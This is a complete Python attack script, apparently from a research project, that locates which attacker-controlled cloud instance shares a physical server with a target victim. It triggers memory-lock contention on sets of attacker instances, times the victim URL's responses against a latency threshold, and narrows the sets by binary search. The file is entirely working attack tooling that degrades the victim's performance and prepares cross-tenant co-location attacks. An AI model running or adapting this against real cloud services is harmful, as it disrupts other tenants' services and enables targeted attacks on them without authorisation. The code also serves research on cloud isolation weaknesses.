#!/usr/bin/env python3
"""
Target Victim Locator (Binary Search over Attacker Sets)

This version uses an absolute latency threshold instead of a baseline slowdown
factor. We assume the user has already determined a response-time threshold T
(e.g., from prior calibration as shown in Figure 8). If the victim's median response time exceeds T
during mem-lock, we treat that as evidence of server sharing.

Inputs:
  - cpu_sets_file: JSON from prepare_attacker_sets.py
  - victim_url:    URL of the target victim
  - latency_threshold: absolute median latency threshold (seconds)

Algorithm:

1) For each architecture set S in cpu_sets:
     - Trigger /lock on ALL instances in S concurrently.
     - Measure victim median latency.
     - If median_latency >= latency_threshold:
         * Select S as the candidate set and proceed to step 2.
   If no set satisfies the threshold, report failure.

2) Binary search within the candidate set:
     - While |S| > 1:
         * Split S into left and right halves.
         * Trigger /lock on left half.
         * Measure victim median latency.
         * If median_latency >= latency_threshold:
               S = left
           else:
               S = right
     - The remaining attacker instance in S is reported as the suspected
       co-resident attacker.
"""

import argparse
import concurrent.futures
import json
import statistics
import sys
import time
from typing import List, Dict, Any

import requests


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Locate the attacker instance sharing a server with a target victim via binary search."
    )
    parser.add_argument(
        "--cpu-sets-file",
        required=True,
        help="Path to JSON file produced by prepare_attacker_sets.py (architecture-based attacker sets).",
    )
    parser.add_argument(
        "--victim-url",
        required=True,
        help="Target victim URL whose server we want to localize.",
    )
    parser.add_argument(
        "--latency-threshold",
        type=float,
        required=True,
        help="Absolute median response time threshold in seconds. "
             "If median_latency >= threshold, we treat it as 'slow'.",
    )
    parser.add_argument(
        "--lock-endpoint",
        default="lock",
        help="Relative /lock endpoint on each attacker instance (default: 'lock').",
    )
    parser.add_argument(
        "--probe-runs",
        type=int,
        default=1,
        help="Number of victim requests to send in each contention probe (default: 1).",
    )
    parser.add_argument(
        "--victim-timeout",
        type=float,
        default=30.0,
        help="HTTP timeout (seconds) for victim requests (default: 30.0).",
    )
    parser.add_argument(
        "--lock-timeout",
        type=float,
        default=60.0,
        help="HTTP timeout (seconds) for /lock requests (default: 60.0).",
    )
    parser.add_argument(
        "--lock-warmup",
        type=float,
        default=0.1,
        help="Sleep (seconds) after triggering /lock before probing the victim (default: 0.1).",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def build_endpoint(base_url: str, endpoint: str) -> str:
    base = base_url.rstrip("/")
    ep = endpoint.lstrip("/")
    return f"{base}/{ep}"


def measure_victim_latency(
    victim_url: str,
    runs: int,
    timeout: float,
) -> float:
    """
    Send `runs` HTTP GET requests to victim_url and return the median latency in seconds.
    """
    latencies = []
    for i in range(runs):
        start = time.perf_counter()
        try:
            resp = requests.get(victim_url, timeout=timeout)
            resp.raise_for_status()
        except requests.RequestException as e:
            print(f"[WARN] Victim request failed on run {i+1}/{runs}: {e}", file=sys.stderr)
            latencies.append(float("inf"))
            continue
        end = time.perf_counter()
        latencies.append(end - start)

    finite_latencies = [x for x in latencies if x != float("inf")]
    if not finite_latencies:
        print("[ERROR] All victim requests failed; cannot compute latency.", file=sys.stderr)
        return float("inf")

    return statistics.median(finite_latencies)


def trigger_lock_async(
    instance_urls: List[str],
    lock_endpoint: str,
    timeout: float,
):
    """
    Trigger /lock concurrently on all given instance URLs.

    We do not block on the full duration of the lock operation; we just fire
    the HTTP requests so the underlying lock workload runs while we probe the victim.
    """
    if not instance_urls:
        return None, []

    def call_lock(url: str):
        full_url = build_endpoint(url, lock_endpoint)
        try:
            resp = requests.get(full_url, timeout=timeout)
            return (url, resp.status_code, None)
        except requests.RequestException as e:
            return (url, None, str(e))

    workers = max(1, len(instance_urls))
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=workers)
    futures = [executor.submit(call_lock, u) for u in instance_urls]
    return executor, futures


def measure_latency_with_lock(
    instance_urls: List[str],
    lock_endpoint: str,
    victim_url: str,
    probe_runs: int,
    victim_timeout: float,
    lock_timeout: float,
    lock_warmup: float,
) -> float:
    """
    1) Trigger /lock on all instance_urls concurrently (async).
    2) Sleep lock_warmup seconds to allow contention to take effect.
    3) Measure victim median latency over probe_runs requests.
    4) Shutdown the executor without waiting for all lock calls to finish.
    """
    if not instance_urls:
        # No attackers -> just measure victim as-is
        return measure_victim_latency(victim_url, probe_runs, victim_timeout)

    executor, futures = trigger_lock_async(instance_urls, lock_endpoint, lock_timeout)

    time.sleep(lock_warmup)

    median_latency = measure_victim_latency(victim_url, probe_runs, victim_timeout)

    if executor is not None:
        executor.shutdown(wait=False)

    # Optional: log lock results
    for fut in futures:
        if not fut.done():
            continue
        url, status_code, err = fut.result()
        if err is not None:
            print(f"[WARN] /lock failed for {url}: {err}", file=sys.stderr)
        else:
            print(f"[INFO] /lock completed for {url} with status {status_code}")

    return median_latency


def is_above_threshold(
    probed_median: float,
    latency_threshold: float,
) -> bool:
    """
    Returns True if probed_median >= latency_threshold.
    """
    return probed_median >= latency_threshold


# ---------------------------------------------------------------------------
# Core logic
# ---------------------------------------------------------------------------

def load_cpu_sets(path: str) -> List[Dict[str, Any]]:
    """
    Load architecture-based attacker sets from JSON produced by prepare_attacker_sets.py.

    Expected structure:
      {
        "cpu_sets": [
          {
            "cpu_brand": "...",
            "parsed_freq": <float or null>,
            "instances": ["https://attacker-1", "https://attacker-2", ...]
          },
          ...
        ]
      }
    """
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)

    cpu_sets = data.get("cpu_sets")
    if not isinstance(cpu_sets, list):
        raise ValueError("cpu_sets_file JSON must contain a 'cpu_sets' list.")

    return cpu_sets


def find_candidate_set(
    cpu_sets: List[Dict[str, Any]],
    victim_url: str,
    lock_endpoint: str,
    latency_threshold: float,
    probe_runs: int,
    victim_timeout: float,
    lock_timeout: float,
    lock_warmup: float,
) -> int:
    """
    Iterate over cpu_sets and find the first set that causes the victim's
    median latency to exceed latency_threshold when all its instances run mem-lock.

    Returns the index of the candidate set in cpu_sets or -1 if none qualifies.
    """
    for idx, cpu_set in enumerate(cpu_sets):
        instances = cpu_set.get("instances", [])
        cpu_brand = cpu_set.get("cpu_brand")
        parsed_freq = cpu_set.get("parsed_freq")

        if not instances:
            print(f"[INFO] Skipping CPU set {idx}: empty instance list.")
            continue

        print(
            f"\n[INFO] Testing CPU set {idx}: brand='{cpu_brand}', parsed_freq={parsed_freq}, "
            f"{len(instances)} instances"
        )

        probed_median = measure_latency_with_lock(
            instance_urls=instances,
            lock_endpoint=lock_endpoint,
            victim_url=victim_url,
            probe_runs=probe_runs,
            victim_timeout=victim_timeout,
            lock_timeout=lock_timeout,
            lock_warmup=lock_warmup,
        )

        print(
            f"[RESULT] CPU set {idx}: median latency with full-set lock = "
            f"{probed_median:.6f}s (threshold={latency_threshold:.6f}s)"
        )

        if is_above_threshold(probed_median, latency_threshold):
            print(f"[INFO] CPU set {idx} selected as candidate set for binary search.")
            return idx

    print("[WARN] No CPU set caused victim latency to exceed the threshold. Target victim not localized.")
    return -1


def binary_search_localization(
    instances: List[str],
    victim_url: str,
    lock_endpoint: str,
    latency_threshold: float,
    probe_runs: int,
    victim_timeout: float,
    lock_timeout: float,
    lock_warmup: float,
) -> str:
    """
    Perform binary search over `instances` to locate the single instance
    sharing a server with the victim, using latency_threshold as the decision boundary.

    Returns:
      The attacker instance URL identified as co-resident (under ideal conditions).
    """
    candidates = list(instances)
    step = 0

    while len(candidates) > 1:
        step += 1
        mid = len(candidates) // 2
        left = candidates[:mid]
        right = candidates[mid:]

        print(
            f"\n[INFO] Binary search step {step}: "
            f"{len(candidates)} candidates -> testing left half ({len(left)} instances)"
        )

        probed_median = measure_latency_with_lock(
            instance_urls=left,
            lock_endpoint=lock_endpoint,
            victim_url=victim_url,
            probe_runs=probe_runs,
            victim_timeout=victim_timeout,
            lock_timeout=lock_timeout,
            lock_warmup=lock_warmup,
        )

        print(
            f"[RESULT] Step {step}: left-half median latency = "
            f"{probed_median:.6f}s (threshold={latency_threshold:.6f}s)"
        )

        if is_above_threshold(probed_median, latency_threshold):
            print(f"[INFO] Step {step}: latency exceeded threshold; keeping LEFT half.")
            candidates = left
        else:
            print(f"[INFO] Step {step}: latency below threshold; keeping RIGHT half.")
            candidates = right

    print(f"\n[FINAL] Binary search completed. Suspected co-resident attacker: {candidates[0]}")
    return candidates[0]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args = parse_args()

    # 1) Load attacker CPU sets
    cpu_sets = load_cpu_sets(args.cpu_sets_file)
    print(f"[INFO] Loaded {len(cpu_sets)} CPU sets from {args.cpu_sets_file}")
    print(f"[INFO] Using latency threshold = {args.latency_threshold:.6f}s")

    # 2) Find candidate CPU set that pushes victim latency over the threshold
    candidate_idx = find_candidate_set(
        cpu_sets=cpu_sets,
        victim_url=args.victim_url,
        lock_endpoint=args.lock_endpoint,
        latency_threshold=args.latency_threshold,
        probe_runs=args.probe_runs,
        victim_timeout=args.victim_timeout,
        lock_timeout=args.lock_timeout,
        lock_warmup=args.lock_warmup,
    )

    if candidate_idx < 0:
        sys.exit(0)  # No candidate found

    candidate_set = cpu_sets[candidate_idx]
    candidate_instances = candidate_set.get("instances", [])

    if len(candidate_instances) == 1:
        print(
            f"[FINAL] Candidate CPU set {candidate_idx} has a single instance; "
            f"co-resident attacker: {candidate_instances[0]}"
        )
        sys.exit(0)

    # 3) Run binary search inside the candidate set
    binary_search_localization(
        instances=candidate_instances,
        victim_url=args.victim_url,
        lock_endpoint=args.lock_endpoint,
        latency_threshold=args.latency_threshold,
        probe_runs=args.probe_runs,
        victim_timeout=args.victim_timeout,
        lock_timeout=args.lock_timeout,
        lock_warmup=args.lock_warmup,
    )


if __name__ == "__main__":
    main()

